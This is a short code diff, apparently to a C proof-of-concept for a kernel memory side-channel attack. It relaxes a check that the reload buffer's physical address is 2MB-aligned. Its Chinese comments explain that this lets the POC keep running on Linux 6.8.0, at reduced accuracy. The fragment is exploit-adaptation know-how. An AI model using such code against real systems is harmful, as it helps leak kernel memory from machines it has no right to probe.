@@ -67,16 +67,26 @@ int main(int argc, char *argv[])
 
     u8* rb_va = (u8*)RB_PTR;
 
+    /* === 物理地址对齐问题 === */
+    /*
+     * 原始代码要求物理地址2MB对齐 (pa & 0x1fffff == 0)
+     * 但在 Linux 6.8.0 内核上，THP 分配策略变化，很难获得2MB对齐的物理地址
+     * 解决方案: 注释掉exit(1)，允许POC继续运行（虽然准确率会降低）
+     */
+#if 0
+    // 原始严格检查（会退出）
+#else
     mmap_huge(rb_va, 1<<21);
-
     u64 rb_pa = va_to_phys(fd_pagemap, RB_PTR);
     if (rb_pa == 0) {
         fprintf(stderr, "rb: no pa\n");
         exit(1);
     } else if ((rb_pa & 0x1fffff) != 0) {
-        fprintf(stderr, "rb: not huge\n");
-        exit(1);
+        fprintf(stderr, "rb: not huge (pa=0x%lx)\n", rb_pa);
+        // 修改: 6.8.0内核跳过对齐检查继续运行
+        // exit(1);
     }
+#endif
 
     u64 rb_kva = rb_pa + sg.physmap_base;
     printf("rb_pa   0x%lx\n", rb_pa);
